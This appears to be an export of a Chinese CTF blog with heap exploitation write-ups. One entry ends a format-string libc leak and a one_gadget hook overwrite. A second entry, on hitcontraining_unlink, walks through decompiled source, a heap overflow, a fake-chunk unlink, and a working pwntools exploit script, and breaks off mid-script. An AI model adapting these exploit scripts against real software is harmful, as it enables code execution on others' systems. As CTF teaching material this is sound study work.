<p>观察到 <code>$rsp + 0x30 - 0x8</code> 的地方有一个 0,那么对应的就需要一个 <code>push</code> 操作, 现在把 <code>realloc + 0x10</code> 改为 <code>realloc + 0xC</code><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924920221.png" alt="file"><br>可以看到已经满足了条件</p>
<p>得到了 shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924970041.png" alt="file"></p>
<h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;29506&quot;)</span></span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./heap&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content,ends = <span class="number">1</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">formats = <span class="string">&quot;%3$p%11$p&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(formats)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">codebase = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x1186</span></span><br><span class="line">print(<span class="string">&quot;codebase ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapArray = codebase + <span class="number">0x202060</span></span><br><span class="line">fake_fd = heapArray + <span class="number">0x20</span></span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0xE1</span>) + p64(fake_fd - <span class="number">0x18</span>) + p64(fake_fd - <span class="number">0x10</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0xE0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xE0</span>) + p64(<span class="number">0xE0</span>)</span><br><span class="line">payload += p64(<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">atoi = <span class="number">0x201FA0</span></span><br><span class="line"></span><br><span class="line">malloc_hook = base + libc.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">realloc_hook = base + libc.dump(<span class="string">&quot;__realloc_hook&quot;</span>)</span><br><span class="line">realloc = base + libc.dump(<span class="string">&quot;realloc&quot;</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(realloc_hook) + <span class="string">b&#x27;\xf8\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + base</span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget) + p64(realloc + <span class="number">0xC</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(codebase + 0x202060))</span></span><br><span class="line">dbg(<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(one_gadget))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x88</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink</title>
    <url>//unlink.html</url>
    <content><![CDATA[<p>Linux 下堆溢出unlink实例。</p>
<a id="more"></a>

<h2 id="unlink-简介"><a href="#unlink-简介" class="headerlink" title="unlink 简介"></a>unlink 简介</h2><p>我知道自己介绍肯定很菜,所以干脆用 CTF WIKI 的来吧<br><a href="https://wiki.x10sec.org/pwn/heap/unlink/">CTFWIKI unlink</a></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>做示例的是 <code>hitcontraining_unlink</code></p>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v3 = hello_message;</span><br><span class="line">  v3[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, _QWORD))*v3)(<span class="number">16L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> *))v3[<span class="number">1</span>])(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v2 = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        itemlist[<span class="number">4</span> * i] = v2;</span><br><span class="line">        *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">        *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, *(<span class="keyword">void</span> **)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>], v2)) = <span class="number">0</span>;</span><br><span class="line">        ++num;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_401089);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">remove_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v1 = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>]);</span><br><span class="line">      *(_QWORD *)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">      itemlist[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove successful!!&quot;</span>);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 change_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST08_4</span><br><span class="line">  int v2; &#x2F;&#x2F; [rsp+4h] [rbp-2Ch]</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+10h] [rbp-20h]</span><br><span class="line">  char nptr; &#x2F;&#x2F; [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *(_QWORD *)&amp;itemlist[4 * v2 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Please enter the length of item name:&quot;, &amp;buf);</span><br><span class="line">      read(0, &amp;nptr, 8uLL);</span><br><span class="line">      v0 &#x3D; atoi(&amp;nptr);</span><br><span class="line">      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);</span><br><span class="line">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v2 + 2] + (signed int)read(0, *(void **)&amp;itemlist[4 * v2 + 2], v0)) &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在 <code>change_item</code> 中没有判断输入字符的个数,导致堆溢出,由于没有开启 <code>PIE</code> 所以 <code>unlink</code> 很方便</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>

<h4 id="伪造堆块"><a href="#伪造堆块" class="headerlink" title="伪造堆块"></a>伪造堆块</h4><p>先 <code>add</code> 三个堆块, 然后利用 <code>edit</code> 的堆溢出,修改 堆块1 ,在 堆块1 中伪造一个假的 chunk,假的 chunk 的结构如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-------------------------</span><br><span class="line">|  presize  |    size   |</span><br><span class="line">|           |    0x20   |</span><br><span class="line">-------------------------</span><br><span class="line">|  fake_fd  |  fake_bk  |</span><br><span class="line">|0x6020D8-0x18| 0x6020D8-0x10|</span><br><span class="line">-------------------------</span><br><span class="line">|  presize  |   size    |</span><br><span class="line">|    0x20   |   0x20    |</span><br><span class="line">-------------------------</span><br><span class="line">|  presize  |   size    |   &lt;----- next chunk</span><br><span class="line">|    0x30   |    0x90   |</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure>
<p>修改了 <code>next chunk</code> 的 <code>inuse</code> 位为0,这样就假装已经被 <code>free</code> 了<br>为什么是 <code>0x6020D8</code> <code>-0x18</code> 和 <code>-0x10</code> 呢<br>因为在内存中,<strong>存放 堆块1 的地址是 <code>0x6020D8</code></strong><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921286897.png" alt="file"></p>
<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>伪造完成之后,释放 堆块2 这个时候在它看来前一个堆块是已经被释放的空闲堆块,那么就要执行 <code>unlink</code> 操作,检查 <code>fd bk</code> 之后,发现符合条件,于是就在 <code>fd + 0x18</code> 的地方写入 堆块1 的地址<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921508591.png" alt="file"></p>
<p>接着 <code>edit</code> 堆块1 就是在修改内存了,可以让 堆块0 指向任意的地址(可写的)去改写</p>
<h4 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h4><p>这里在 leak libc 之后选择 <code>atoi</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fake = <span class="number">0x6020D8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(fake - <span class="number">0x18</span>) + p64(fake - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;x/20gx 0x6020C0&quot;</span>)</span><br><span class="line">free_plt = elf.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">pus_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x80</span>) + p64(free_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recv(<span class="number">4</span>)</span><br><span class="line">c = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">base = addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(<span 